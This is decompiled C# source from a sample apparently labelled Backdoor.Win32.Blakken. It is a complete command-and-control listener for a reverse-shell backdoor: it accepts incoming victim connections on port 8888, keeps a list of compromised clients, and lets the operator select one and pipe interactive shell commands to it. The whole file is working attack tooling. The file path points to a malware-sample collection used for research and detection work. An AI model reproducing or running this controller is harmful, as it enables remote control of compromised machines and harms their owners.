// Decompiled with JetBrains decompiler
// Type: ManagerMarket.Module1
// Assembly: cDisplayClass310, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8C7A4461-A171-4409-B75B-AB5BE5ABB986
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\Backdoor.Win32.Blakken.vor-a227cf3f5fb90a859db6b3a95e95ead7b01dc01615de5433710205c6cd58ec78.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Timers;

namespace ManagerMarket
{
  [StandardModule]
  internal sealed class Module1
  {
    private static long lPort = 8888;
    private static int selClient = -10;
    private static List<Module1.handleClient> clientList = new List<Module1.handleClient>();
    private static TcpListener serverSocket;
    private static bool shellMode;

    static Module1() => Module1.tmrDisconnectCheck = new System.Timers.Timer();

    internal static System.Timers.Timer tmrDisconnectCheck
    {
      get => Module1._tmrDisconnectCheck;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ElapsedEventHandler elapsedEventHandler = new ElapsedEventHandler(Module1.tmrDisconnectCheck_Elapsed);
        System.Timers.Timer tmrDisconnectCheck1 = Module1._tmrDisconnectCheck;
        if (tmrDisconnectCheck1 != null)
          tmrDisconnectCheck1.Elapsed -= elapsedEventHandler;
        Module1._tmrDisconnectCheck = value;
        System.Timers.Timer tmrDisconnectCheck2 = Module1._tmrDisconnectCheck;
        if (tmrDisconnectCheck2 == null)
          return;
        tmrDisconnectCheck2.Elapsed += elapsedEventHandler;
      }
    }

    public static void Main()
    {
      string[] commandLineArgs = Environment.GetCommandLineArgs();
      if (commandLineArgs.Length > 1 && Versioned.IsNumeric((object) commandLineArgs[1]))
        Module1.lPort = Conversions.ToLong(commandLineArgs[1]);
      Module1.serverSocket = new TcpListener(IPAddress.Any, checked ((int) Module1.lPort));
      new Thread(new ThreadStart(Module1.cmdListener)).Start();
      new Thread(new ThreadStart(Module1.sListener)).Start();
      Module1.tmrDisconnectCheck.Interval = 5000.0;
      Module1.tmrDisconnectCheck.Enabled = true;
    }

    public static void cmdListener()
    {
      while (true)
      {
        Module1.writePrompt();
        Module1.parseCmd(Console.ReadLine());
      }
    }

    public static void writePrompt()
    {
      if (Module1.shellMode)
      {
        Console.ForegroundColor = ConsoleColor.Black;
        Console.BackgroundColor = ConsoleColor.Green;
        Console.Write("sh>");
        Console.ResetColor();
      }
      else
      {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write(">>>");
        Console.ResetColor();
      }
    }

    public static void doSend(string cmd)
    {
      Module1.handleClient client = Module1.clientList[Module1.selClient];
      if (Operators.CompareString(cmd, "", false) == 0)
        return;
      NetworkStream stream = client.clientSocket.GetStream();
      byte[] bytes = Encoding.ASCII.GetBytes(cmd);
      stream.Write(bytes, 0, bytes.Length);
      stream.Flush();
    }

    public static void checkDisconnected()
    {
      int num = checked (Module1.clientList.Count - 1);
      int index = 0;
      while (index <= num)
      {
        bool blocking = Module1.clientList[index].clientSocket.Client.Blocking;
        try
        {
          byte[] buffer = new byte[1];
          Module1.clientList[index].clientSocket.Client.Blocking = false;
          Module1.clientList[index].clientSocket.Client.Send(buffer, 0, SocketFlags.None);
          Module1.clientList[index].clientSocket.Client.Blocking = blocking;
        }
        catch (SocketException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          if (ex.NativeErrorCode != 10035)
          {
            Module1.dbg("DISCONNECTED - " + Module1.clientList[index].remoteIP + ":" + Module1.clientList[index].remotePORT, "+");
            Module1.clientList.Remove(Module1.clientList[index]);
            if (Module1.selClient == index)
              Module1.selClient = -10;
          }
          else
            Module1.clientList[index].clientSocket.Client.Blocking = blocking;
          ProjectData.ClearProjectError();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Module1.dbg("DISCONNECTED - " + Module1.clientList[index].remoteIP + ":" + Module1.clientList[index].remotePORT, "+");
          Module1.clientList.Remove(Module1.clientList[index]);
          if (Module1.selClient == index)
            Module1.selClient = -10;
          ProjectData.ClearProjectError();
          break;
        }
        checked { ++index; }
      }
    }

    public static void parseCmd(string cmd)
    {
      if (Module1.shellMode)
      {
        if (Operators.CompareString(cmd, "exit", false) == 0)
        {
          Module1.shellMode = false;
          Module1.dbg("SHELL returned to background");
        }
        else
          Module1.doSend(cmd);
      }
      if (Module1.shellMode)
        return;
      string[] strArray = Strings.Split(cmd);
      string str = strArray[0];
      // ISSUE: reference to a compiler-generated method
      switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(str))
      {
        case 217798785:
          if (Operators.CompareString(str, "list", false) == 0)
          {
            Module1.displayClientList();
            goto default;
          }
          else
            goto default;
        case 297952813:
          if (Operators.CompareString(str, "select", false) == 0 && strArray.Length > 0)
          {
            if ((double) checked (Module1.clientList.Count - 1) >= Conversions.ToDouble(strArray[1]))
            {
              Module1.selClient = Conversions.ToInteger(strArray[1]);
              Module1.dbg("Selected [" + Conversions.ToString(Module1.selClient) + "] - " + Module1.clientList[Module1.selClient].remoteIP + ":" + Module1.clientList[Module1.selClient].remotePORT);
            }
            else
              Module1.dbg("Error in select");
            goto default;
          }
          else
            goto default;
        case 300022785:
          if (Operators.CompareString(str, "shell", false) == 0 && Module1.selClient != -10)
          {
            Module1.dbg("Connected to SHELL of: [" + Conversions.ToString(Module1.selClient) + "] - " + Module1.clientList[Module1.selClient].remoteIP + ":" + Module1.clientList[Module1.selClient].remotePORT);
            Module1.shellMode = true;
            goto default;
          }
          else
            goto default;
        case 946971642:
          if (Operators.CompareString(str, "help", false) == 0)
            break;
          goto default;
        case 973910158:
          if (Operators.CompareString(str, "?", false) == 0)
            break;
          goto default;
        case 2408750110:
          if (Operators.CompareString(str, "client", false) == 0)
          {
            Module1.dbg("Current Client - [" + Conversions.ToString(Module1.selClient) + "] - " + Module1.clientList[Module1.selClient].remoteIP + ":" + Module1.clientList[Module1.selClient].remotePORT);
            goto default;
          }
          else
            goto default;
        case 3005452862:
          if (Operators.CompareString(str, "about", false) == 0)
          {
            Module1.dbg("Designed by b7001 (https://github.com/b7001)", "i");
            goto default;
          }
          else
            goto default;
        case 3306112409:
          if (Operators.CompareString(str, "kill", false) == 0 && strArray.Length > 0)
          {
            if ((double) checked (Module1.clientList.Count - 1) >= Conversions.ToDouble(strArray[1]))
            {
              Module1.dbg("Killing [" + strArray[1] + "] - " + Module1.clientList[Conversions.ToInteger(strArray[1])].remoteIP + ":" + Module1.clientList[Conversions.ToInteger(strArray[1])].remotePORT);
              Module1.clientList[Conversions.ToInteger(strArray[1])].clientSocket.Close();
              Module1.checkDisconnected();
            }
            else
              Module1.dbg("Error in kill");
            goto default;
          }
          else
            goto default;
        case 3977000791:
          if (Operators.CompareString(str, "h", false) == 0)
            break;
          goto default;
        default:
label_30:
          return;
      }
      Module1.dbg("#### HELP ####", "?");
      Module1.dbg("list - List all connected clients", "?");
      Module1.dbg("select <id> - Select client for further actions", "?");
      Module1.dbg("shell - Interactive shell to selected client", "?");
      Module1.dbg("client - Currently selected client info", "?");
      Module1.dbg("kill <id> - Close connection of client", "?");
      Module1.dbg("help - Currently selected client info", "?");
      Module1.dbg("about - Some shameless self promotion", "?");
      Module1.dbg("#### END HELP ####", "?");
      goto label_30;
    }

    public static void displayClientList()
    {
      Module1.dbg("Clients Connected: " + Conversions.ToString(Module1.clientList.Count), "?");
      int num = checked (Module1.clientList.Count - 1);
      int index = 0;
      while (index <= num)
      {
        Module1.dbg("[" + Conversions.ToString(index) + "] - " + Module1.clientList[index].remoteIP + ":" + Module1.clientList[index].remotePORT);
        checked { ++index; }
      }
    }

    public static void sListener()
    {
      Module1.serverSocket.Start();
      Module1.dbg("Server Started on 0.0.0.0:" + Conversions.ToString(Module1.lPort));
      int num = 0;
      while (true)
      {
        checked { ++num; }
        TcpClient inClientSocket = Module1.serverSocket.AcceptTcpClient();
        Module1.handleClient handleClient = new Module1.handleClient();
        handleClient.startClient(inClientSocket, Convert.ToString(num));
        Module1.clientList.Add(handleClient);
        handleClient.clientID = Module1.clientList.IndexOf(handleClient);
        handleClient.remoteIP = ((IPEndPoint) handleClient.clientSocket.Client.RemoteEndPoint).Address.ToString();
        handleClient.remotePORT = ((IPEndPoint) handleClient.clientSocket.Client.RemoteEndPoint).Port.ToString();
        Module1.dbg("CONNECTED - " + handleClient.remoteIP + ":" + handleClient.remotePORT, "+");
      }
    }

    public static void dbg(string msg, string mode = "")
    {
      string str1 = "";
      msg.Trim();
      if (Operators.CompareString(mode, "", false) == 0)
        str1 = "[+]";
      string Left = mode;
      string str2;
      int num;
      if (Operators.CompareString(Left, "i", false) != 0)
      {
        if (Operators.CompareString(Left, "?", false) != 0)
        {
          if (Operators.CompareString(Left, "-", false) != 0)
          {
            if (Operators.CompareString(Left, "+", false) == 0)
            {
              str2 = "[+]";
              num = 13;
            }
            else
            {
              str2 = "[i]";
              num = 7;
            }
          }
          else
          {
            str2 = "[-]";
            num = 12;
          }
        }
        else
        {
          str2 = "[?]";
          num = 7;
        }
      }
      else
      {
        str2 = "[i]";
        num = 14;
      }
      Console.ForegroundColor = (ConsoleColor) num;
      Console.WriteLine(str2 + " " + msg);
      Console.ResetColor();
    }

    public static void doOutputCheck(string s, int c)
    {
      if (c != Module1.selClient)
        return;
      Console.WriteLine(s);
      Console.WriteLine("");
      Module1.writePrompt();
    }

    private static void tmrDisconnectCheck_Elapsed(object sender, ElapsedEventArgs e)
    {
      Module1.checkDisconnected();
      Module1.tmrDisconnectCheck.Enabled = true;
    }

    public class handleClient
    {
      public TcpClient clientSocket;
      private string clNo;

      public handleClient()
      {
        this.remoteIP = "";
        this.remotePORT = "";
        this.clientID = 0;
      }

      public string remoteIP { get; set; }

      public string remotePORT { get; set; }

      public int clientID { get; set; }

      public void startClient(TcpClient inClientSocket, string clineNo)
      {
        this.clientSocket = inClientSocket;
        this.clNo = clineNo;
        new Thread(new ThreadStart(this.doRecv)).Start();
      }

      private void doRecv()
      {
        byte[] numArray = new byte[checked (this.clientSocket.ReceiveBufferSize + 1)];
        while (true)
        {
          try
          {
            if (this.clientSocket.Connected)
            {
              Thread.Sleep(1);
              NetworkStream stream = this.clientSocket.GetStream();
              if (stream.CanRead & stream.DataAvailable)
              {
                int count1 = stream.Read(numArray, 0, this.clientSocket.ReceiveBufferSize);
                string s = Encoding.ASCII.GetString(numArray, 0, count1);
                while (stream.CanRead & stream.DataAvailable)
                {
                  int count2 = stream.Read(numArray, 0, numArray.Length);
                  s += Encoding.ASCII.GetString(numArray, 0, count2);
                }
                Module1.doOutputCheck(s, this.clientID);
              }
            }
          }
          catch (SocketException ex)
          {
            ProjectData.SetProjectError((Exception) ex);
            if (ex.NativeErrorCode != 10035)
            {
              Module1.dbg("DISCONNECTED - " + Module1.clientList[this.clientID].remoteIP + ":" + Module1.clientList[this.clientID].remotePORT, "+");
              Module1.clientList.Remove(Module1.clientList[this.clientID]);
              if (Module1.selClient == this.clientID)
                Module1.selClient = -10;
              ProjectData.ClearProjectError();
              break;
            }
            Module1.clientList[this.clientID].clientSocket.Client.Blocking = true;
            ProjectData.ClearProjectError();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            break;
          }
        }
      }
    }
  }
}
